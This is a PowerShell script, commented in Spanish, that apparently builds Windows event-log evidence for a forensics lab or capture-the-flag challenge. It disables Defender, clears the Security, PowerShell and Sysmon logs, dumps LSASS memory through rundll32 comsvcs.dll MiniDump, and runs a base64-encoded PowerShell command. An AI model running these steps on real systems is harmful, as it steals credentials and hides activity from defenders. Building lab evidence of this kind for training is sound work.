<#
  Credential Harvest — generador de evidencia (Windows Event Logs).

  Escenario (Credential Access): el atacante vuelca la memoria de LSASS con el
  LOLBin comsvcs.dll (MiniDump) via rundll32 para robar credenciales, y luego
  ejecuta un PowerShell que referencia el botin. Sysmon registra el acceso al
  proceso lsass.exe (Event ID 10, ProcessAccess) — la firma clasica del dumping.

  Flag por env SI_FLAG (nunca por linea de comandos). Aparece en el 4104.
  MITRE: T1003.001 (OS Credential Dumping: LSASS Memory), T1059.001, T1218.011.
#>
param([string]$OutDir = "C:\evidence")
$ErrorActionPreference = "Continue"
$Flag = $env:SI_FLAG; if (-not $Flag) { $Flag = "NORTHWIND{unset_flag}" }
New-Item -ItemType Directory -Force -Path $OutDir | Out-Null

Write-Host "[*] 1/6 Audit policies + Script Block Logging..."
auditpol /set /subcategory:"Process Creation" /success:enable | Out-Null
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled /t REG_DWORD /d 1 /f | Out-Null
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1

Write-Host "[*] 2/6 Bajando Defender (para no interferir con el dump de laboratorio)..."
Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
Add-MpPreference -ExclusionPath "$OutDir" -ErrorAction SilentlyContinue

Write-Host "[*] 3/6 Instalando Sysmon (config SwiftOnSecurity)..."
try {
  Invoke-WebRequest -UseBasicParsing -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
  Expand-Archive "$env:TEMP\Sysmon.zip" -DestinationPath "$env:TEMP\sysmon" -Force
  Invoke-WebRequest -UseBasicParsing -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile "$env:TEMP\sysmonconfig.xml"
  & "$env:TEMP\sysmon\Sysmon64.exe" -accepteula -i "$env:TEMP\sysmonconfig.xml" | Out-Null
  Start-Sleep -Seconds 5
} catch { Write-Host "[!] Sysmon no disponible: $_" }

Write-Host "[*] 4/6 Limpiando logs (evidencia enfocada)..."
wevtutil cl Security 2>$null
wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
wevtutil cl "Microsoft-Windows-Sysmon/Operational" 2>$null
Start-Sleep -Seconds 2

Write-Host "[*] 5/6 Escenario: volcado de LSASS via comsvcs.dll MiniDump..."
$lsass = Get-Process lsass -ErrorAction SilentlyContinue
if ($lsass) {
  $pid_lsass = $lsass.Id
  Write-Host "    lsass PID = $pid_lsass"
  # LOLBin clasico: rundll32 comsvcs.dll MiniDump <pid> <out> full  -> Sysmon 10 (ProcessAccess a lsass)
  Start-Process -FilePath "rundll32.exe" -ArgumentList "C:\Windows\System32\comsvcs.dll, MiniDump $pid_lsass $OutDir\lsass.dmp full" -Wait -WindowStyle Hidden
  Start-Sleep -Seconds 3
}
# El atacante "procesa" el volcado -> 4104 con el botin (la flag)
$payload = "`$dump='$OutDir\lsass.dmp'; `$tool='mimikatz'; `$loot='$Flag'; Write-Output ('creds extracted: ' + `$loot)"
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($payload))
powershell.exe -NoProfile -EncodedCommand $enc | Out-Null
Start-Sleep -Seconds 6

Write-Host "[*] 6/6 Exportando .evtx..."
wevtutil epl "Microsoft-Windows-Sysmon/Operational" "$OutDir\Sysmon.evtx" /ow:true
wevtutil epl "Microsoft-Windows-PowerShell/Operational" "$OutDir\PowerShell.evtx" /ow:true
wevtutil epl Security "$OutDir\Security.evtx" /ow:true
Get-ChildItem $OutDir | Format-Table Name, Length
